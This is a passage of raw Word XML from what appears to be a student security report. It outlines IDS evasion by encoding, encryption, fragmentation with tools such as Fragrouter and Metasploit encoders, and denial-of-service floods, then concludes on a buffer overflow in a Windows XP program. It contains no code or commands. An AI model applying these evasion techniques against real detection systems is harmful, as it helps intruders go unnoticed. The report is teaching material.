      <w:r w:rsidR="00FA045B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>, hence the name. Therefore, it is important to understand that certain techniques will be determined to be obsolete or weaker in one variety even if it excels in the other due to the nature of the detection technique being used</w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with AIDS generally being favored among professionals </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="126753459"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Say22 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Saylor Academy, 2022)</w:t>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00FA045B">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="004A13DD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Hybrid systems of AIDS and SIDS exist, but</w:t>
      </w:r>
      <w:r w:rsidR="00256D8F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> only the two most common systems will be discussed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF90916" w14:textId="0C3DF434" w:rsidR="00DB0770" w:rsidRDefault="00DB0770" w:rsidP="00DB0770">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="_Toc103326477"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Obfuscation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
    </w:p>
    <w:p w14:paraId="3FCE365F" w14:textId="162FADB3" w:rsidR="00DB0770" w:rsidRDefault="008F0CB4" w:rsidP="00DB0770">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacks attempt to replace each alphanumerical character with its hexadecimal counterpart, tricking the IDS into believing </w:t>
      </w:r>
      <w:r w:rsidR="00BE70D4">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>a packet stream is not dangerous because it can’t identify the alphanumerical characters it was designed for. This concept was demonstrated throughout tutorial 1 in the form of alpha upper encoding, which could be used to bypass character filtering in a buffer overflow attack. Many encoding tools exist, with the most popular among them coming from the Metasploit Framework (MSF), again, utilized throughout the tutorials. This form of encoding can be used to exploit IDS in the same way, using the same</w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> encoding</w:t>
      </w:r>
      <w:r w:rsidR="00BE70D4">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> tools.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066BDAE7" w14:textId="7F7B6F42" w:rsidR="00BE70D4" w:rsidRPr="00DB0770" w:rsidRDefault="00BE70D4" w:rsidP="00DB0770">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Encryption attacks work a little differently from Encoding, as they </w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">make use of cryptography and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">rely on the IDS to reconstruct the packet stream after determining it to be safe. This can </w:t>
      </w:r>
      <w:r w:rsidR="00DC56CC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>occur because</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the IDS is unable to read the contents of the stream, and since it cannot understand the dangerous, encrypted contents, it passes it through ready for reconstruction.</w:t>
      </w:r>
      <w:r w:rsidR="00C20B73">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Various encryption methods are available in software and web-based tools, with many available payloads in modern versions of the Metasploit Framework which gives the attacker a choice of encryption methods, salts, and whether or not the data can be accessed by public or private keys </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="673846606"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00C20B73">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00C20B73">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION IMB21 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00C20B73">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(IMB, 2021)</w:t>
          </w:r>
          <w:r w:rsidR="00C20B73">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00C20B73">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05220EFA" w14:textId="6508BF4A" w:rsidR="00DB0770" w:rsidRDefault="00DB0770" w:rsidP="00DB0770">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_Toc103326478"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Evasion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w14:paraId="2F941849" w14:textId="6B003C2D" w:rsidR="004A13DD" w:rsidRDefault="00FA045B" w:rsidP="00DB0770">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>An example of an attack that works much more effectively against an SIDS compared to a AIDS is the ‘zero-day’ attack, which aims to exploit</w:t>
      </w:r>
      <w:r w:rsidR="004A13DD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SIDS and the fact their databases most often do not have a chance to get updated in preparation for the attack </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-2039414066"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="004A13DD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="004A13DD">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Khr19 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="004A13DD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Khraisat, Gondal, Vamplew, &amp; Kamruzzaman, 2019)</w:t>
          </w:r>
          <w:r w:rsidR="004A13DD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="004A13DD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>. Zero-day attacks are named such because hackers produce an exploit for a vulnerability that is entirely unknown to those who wish to mitigate it, in this case, whoever is updating the attack signatures on a SIDS. This will result in the IDS not being able to detect an ongoing attack, with the attackers effectively ‘evading’ the system. Due to the way AIDS picks up on anomalous data, it is highly likely that any malicious data being send through an AIDS-connected network will be flagged on the system, making the attack much less effective in comparison on systems making use of machine learning.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAE0DA0" w14:textId="301357AC" w:rsidR="004A13DD" w:rsidRPr="00DB0770" w:rsidRDefault="00256D8F" w:rsidP="00DB0770">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Another common evasion technique is fragmentation, which splits sent data into much smaller packets, relying on the IDS to reassemble the packet after determining the packets are safe. This cannot be done by simply segmenting the data stream into fragments however, and largely relies on the packets to be heavily modified as a way of making it harder for the IDS to determine whether the packets are dangerous during reassembly, like making the packets overlap. Fragmentation can be performed through the use of two popular tools, Fragrouter and Whisker which act in a similar way. Fragrouter in particular allows network traffic to be routed from the host to the target via itself, with various options on fragmented packet sizes</w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="587283533"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="008F0CB4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="008F0CB4">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Wym02 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="008F0CB4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t xml:space="preserve"> </w:t>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Wyman, 2002)</w:t>
          </w:r>
          <w:r w:rsidR="008F0CB4">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E825772" w14:textId="24BEB1CD" w:rsidR="00FA045B" w:rsidRDefault="00DB0770" w:rsidP="00FA045B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc103326479"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
    </w:p>
    <w:p w14:paraId="3AB8F171" w14:textId="1D126595" w:rsidR="00256D8F" w:rsidRPr="00256D8F" w:rsidRDefault="008F0CB4" w:rsidP="00256D8F">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Denial of Service attacks are infamously noisy in </w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>principle and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> aim to disable the IDS by either overloading it with packets </w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>like in the event of an ARP flood</w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or by overworking the system itself to shut down as a preventative measure for abnormally high temperatures or CPU, </w:t>
      </w:r>
      <w:r w:rsidR="00503D1E">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>storage,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or memory utilization. ARP floods bounce ARP request packets around the network from one computer to another repeatedly, only building up in size and bandwidth utilization until no network-related action can be performed and effectively bring down the network. These attacks aim to interfere with the way the IDS interacts with packets, either by slowing down the network or IDS itself, or shutting them down</w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> entirely</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Various countermeasures exist for these sorts of attacks, namely by blocking echo requests (for ping attacks), enabling ARP protection, and adjusting the maximum threshold of packets allowed, or by building redundancy into the network infrastructure to prevent packets from overloading the only data center on the network, as the computational load should be shared equally among a small number of devices </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:eastAsia="en-US"/>
          </w:rPr>
          <w:id w:val="-305015828"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Pau18 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-US"/>
            </w:rPr>
            <w:t>(Rubens, 2018)</w:t>
          </w:r>
          <w:r w:rsidR="00F97BCD">
            <w:rPr>
              <w:lang w:eastAsia="en-US"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00F97BCD">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BD9819" w14:textId="5C1F84AB" w:rsidR="00B61F44" w:rsidRPr="0068240D" w:rsidRDefault="009525A9" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Toc102919487"/>
      <w:bookmarkStart w:id="49" w:name="_Toc103326480"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="172B1D68" w14:textId="77777777" w:rsidR="0068240D" w:rsidRDefault="00247263" w:rsidP="008332D2">
      <w:r>
        <w:t>In conclusion, the given program was found to be vulnerable to various forms of buffer overflow attacks</w:t>
      </w:r>
      <w:r w:rsidR="00B61F44">
        <w:t xml:space="preserve"> due to its lack of buffer overflow protection</w:t>
      </w:r>
      <w:r w:rsidR="009F1452">
        <w:t>, lack of updates from its creators,</w:t>
      </w:r>
      <w:r w:rsidR="00B61F44">
        <w:t xml:space="preserve"> and the fact it was running on an out of date, unsecure operating system - Windows XP.</w:t>
      </w:r>
      <w:r w:rsidR="009F1452">
        <w:t xml:space="preserve"> These factors contributed significantly to the vulnerability of the system, particularly the fact that the application was simply not coded to make use of appropriate security measures in its skin upload feature. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B54C842" w14:textId="482C46F7" w:rsidR="006F4C01" w:rsidRPr="002A52AF" w:rsidRDefault="0021744F" w:rsidP="008332D2">
      <w:r>
        <w:t xml:space="preserve">Modern operating systems </w:t>
      </w:r>
      <w:r w:rsidR="009F1452">
        <w:t>Windows 10 or 11</w:t>
      </w:r>
      <w:r w:rsidR="0068240D">
        <w:t>, which are not only regularly updated, but are built using more modern, secure methods with vulnerabilities as severe as those documented</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> throughout the tutorials</w:t>
      </w:r>
      <w:r w:rsidR="0068240D">
        <w:t xml:space="preserve"> being relatively rarer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> show just how far security has come since the release of Windows XP. </w:t>
      </w:r>
      <w:r w:rsidR="009F1452">
        <w:t>Even with Windows XP’s built-in Data Execution Prevention enabled for all applications, it was</w:t>
      </w:r>
      <w:r w:rsidR="0068240D">
        <w:t xml:space="preserve"> possible to circumvent this protection with a few carefully crafted scripts and knowledge that is freely available online for any to view.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="50" w:name="_Toc103326481" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="1401015027"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr/>
      <w:sdtContent>
        <w:p w14:paraId="33B622FC" w14:textId="6EC57FB2" w:rsidR="00941EC1" w:rsidRDefault="00941EC1">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
          <w:bookmarkEnd w:id="50"/>
        </w:p>
        <w:sdt>
          <w:sdtPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtEndPr/>
          <w:sdtContent>
            <w:p w14:paraId="4634806B" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00941EC1" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:fldChar w:fldCharType="begin"/>
              </w:r>
              <w:r>
                <w:instrText xml:space="preserve"> BIBLIOGRAPHY </w:instrText>
              </w:r>
              <w:r>
                <w:fldChar w:fldCharType="separate"/>
              </w:r>
              <w:r w:rsidR="00DC56CC">
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">CloudFlare. (2022, 05 12). </w:t>
              </w:r>
              <w:r w:rsidR="00DC56CC">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>What is buffer overflow?</w:t>
              </w:r>
              <w:r w:rsidR="00DC56CC">
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> Retrieved from CloudFlare: https://www.cloudflare.com/en-gb/learning/security/threats/buffer-overflow/</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="672F6B96" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Dowd, M., McDonald, J., &amp; Schuh, J. (2007). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>The Art of Software Security Assessment.</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> Boston: Addison-Wesley.</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="213F526E" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Harán, J. M. (2018, 11 12). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Malware of the 90s: Remembering the Michelangelo and Melissa viruses</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from We Live Security: https://www.welivesecurity.com/2018/11/12/malware-90s-michelangelo-melissa-viruses/</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1549FFE2" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">IMB. (2021, 03 03). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Encryption Concepts.</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> Retrieved from IBM: https://www.ibm.com/docs/en/ds8870/7.5.0?topic=HW213_7.5.0/com.ibm.storage.ssic.help.doc/f2c_encryption_concepts_3ekm4r.html</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="52EA443D" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Katoch, V. (no date). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Whitepaper on Bypassing ASLR/DEP.</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve"> New Delhi: Secfence Technologies. Retrieved from https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0048A86A" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Khraisat, A., Gondal, I., Vamplew, P., &amp; Kamruzzaman, J. (2019, 7 17). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Survey of intrusion detection systems: techniques, datasets and challenges</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from Springer Link: https://link.springer.com/article/10.1186/s42400-019-0038-7</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="7E718C39" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Lanaro, S. (2021, 02 10). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>steflan-security</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t>. Retrieved from Complete Guide to Stack Buffer Overflow (OSCP Preparation): https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/#crashing-the-application</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="651D5CDE" w14:textId="77777777" w:rsidR="00DC56CC" w:rsidRDefault="00DC56CC" w:rsidP="00DC56CC">
              <w:pPr>
                <w:pStyle w:val="Bibliography"/>
                <w:ind w:left="720" w:hanging="720"/>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:noProof/>
                </w:rPr>
                <w:t xml:space="preserve">Le Berre, S., &amp; Cauquil, D. (no date). </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                  <w:noProof/>
                </w:rPr>
                <w:t>Bypassing SEHOP.</w:t>
